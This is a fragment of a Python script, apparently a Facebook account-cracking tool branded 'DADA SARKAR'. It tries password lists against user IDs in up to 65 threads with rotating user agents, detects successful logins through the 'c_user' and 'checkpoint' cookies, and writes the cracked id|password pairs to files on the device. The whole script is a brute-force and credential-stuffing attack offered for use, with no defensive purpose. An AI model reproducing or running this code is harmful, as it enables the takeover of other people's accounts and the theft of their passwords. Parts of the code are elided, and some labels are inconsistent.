...
logo=("""
      \033[92;1mdb    db d888888b db    db  .d8b.  d8888b.
      \033[97;1m`8b  d8'   `88'   `8b  d8' d8' `8b 88  `8D
       \033[92;1m`8bd8'     88     `8bd8'  88ooo88 88   88
       \033[97;1m.dPYb.     88       88    88~~~88 88   88
      \033[92;1m.8P  Y8.   .88.      88    88   88 88  .8D
      \033[97;1mYP    YP Y888888P    YP    YP   YP Y8888D'
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : DADA SARKAR
\033[97;1m>>     Facebook : DADA SARKAR
\033[97;1m>>     Version  : 1.1
\033[97;1m>>     Git hop  : DADA SARKAR
\033[92;1m>>     TEAM  : \x1b[91;1m ALONE😳
\033[91;1m--------------------------------------------------""")
def linex():
	print('\033[91;1m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> DADA  VERSION :\x1b[1;92m 1.1 ')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://https://chat.whatsapp.com/G1j2BvoyQaEK9Lp1K26eby');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[DADA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[DADA-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/XIYAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[DADA-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/XIYAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[DADA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[DADA-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[DADA-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/XIYAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def random_number1():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		print('\x1b[97;1m[+] Your Select Code : '+kode)
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mDADA\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[DADA-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[DADA-OK] '+uid+' | '+ps+'\33[0;97m')
